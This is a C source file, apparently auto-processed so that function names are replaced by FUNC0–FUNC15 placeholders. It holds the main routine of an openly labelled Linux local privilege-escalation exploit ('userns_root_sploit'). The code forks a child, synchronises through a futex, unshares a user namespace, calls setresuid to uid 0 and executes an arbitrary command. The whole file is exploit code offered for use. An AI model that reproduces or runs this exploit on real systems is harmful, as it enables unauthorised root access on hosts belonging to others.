#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int pid_t ;

/* Variables and functions */
 int /*<<< orphan*/  CLONE_NEWUSER ; 
 int /*<<< orphan*/  FUTEX_WAKE ; 
 int MAP_ANONYMOUS ; 
 int* MAP_FAILED ; 
 int MAP_SHARED ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int /*<<< orphan*/  SIGCHLD ; 
 int /*<<< orphan*/  SIG_DFL ; 
 int /*<<< orphan*/  SYS_futex ; 
 scalar_t__ FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int,char*) ; 
 int /*<<< orphan*/  FUNC4 (int,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char**) ; 
 int FUNC6 () ; 
 int* ftx ; 
 int /*<<< orphan*/  FUNC7 () ; 
 int* FUNC8 (int /*<<< orphan*/ ,int,int,int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  parent ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 scalar_t__ FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC12 (int /*<<< orphan*/ ,int*,int /*<<< orphan*/ ,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC13 (int /*<<< orphan*/ ) ; 
 int FUNC14 (int*) ; 

int FUNC15(int argc, char **argv)
{
  int dummy, status;
  pid_t child;
 
  if (argc < 2) {
    FUNC9("usage: userns_root_sploit COMMAND ARGS...\n\n"
           "This will run a command as (global) uid 0 but no capabilities.\n");
    return 1;
  }
 
  ftx = FUNC8(0, sizeof(int), PROT_READ | PROT_WRITE,
             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (ftx == MAP_FAILED)
    FUNC3(1, "mmap");
 
  parent = FUNC7();
 
  if (FUNC11(SIGCHLD, SIG_DFL) != 0)
    FUNC3(1, "signal");
 
  child = FUNC6();
  if (child == -1)
    FUNC3(1, "fork");
  if (child == 0)
    return FUNC2();
 
  *ftx = 1;
  if (FUNC12(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0)
    FUNC3(1, "futex");
 
  if (FUNC13(CLONE_NEWUSER) != 0)
    FUNC3(1, "unshare(CLONE_NEWUSER)");
 
  if (FUNC14(&status) != child)
    FUNC3(1, "wait");
  if (!FUNC1(status) || FUNC0(status) != 0)
    FUNC4(1, "child failed");
 
  if (FUNC10(0, 0, 0) != 0)
    FUNC3(1, "setresuid");
  FUNC5(argv[1], argv+1);
  FUNC3(1, argv[1]);
 
  return 0;
}